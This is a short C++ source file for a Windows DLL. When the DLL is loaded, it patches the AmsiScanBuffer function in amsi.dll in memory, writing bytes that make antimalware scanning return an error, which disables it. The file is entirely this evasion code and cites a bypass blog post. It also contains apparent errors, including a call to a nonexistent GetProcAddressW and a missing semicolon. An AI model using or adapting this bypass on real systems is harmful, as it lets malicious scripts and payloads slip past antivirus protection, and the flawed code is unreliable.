#include <windows.h>

void PatchAmsiScanBuffer();

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {

	switch (dwReason)  {
		case DLL_PROCESS_ATTACH:
			PatchAmsiScanBuffer();
			break;
			
		case DLL_THREAD_ATTACH:
			break;
			
		case DLL_THREAD_DETACH:
			break;
			
		case DLL_PROCESS_DETACH:
			break;
	}
	
	return TRUE;
}

void PatchAmsiScanBuffer()
{	
	HMODULE amsiDllHandle = ::LoadLibraryW(L"amsi.dll");
	FARPROC addr = ::GetProcAddressW(amsiDllHandle, L"AmsiScanBuffer");
	
	// https://rastamouse.me/blog/asb-bypass-pt3/
	char patch[6] = {0xB8, 0x57, 0x00, 0x07,0x80, 0xC3};
	
	HANDLE processHandle = ::GetCurrentProcess();
	
	::WriteProcessMemory(processHandle, addr, (PVOID)patch, (SIZE_T)6, (SIZE_T *)nullptr)
}
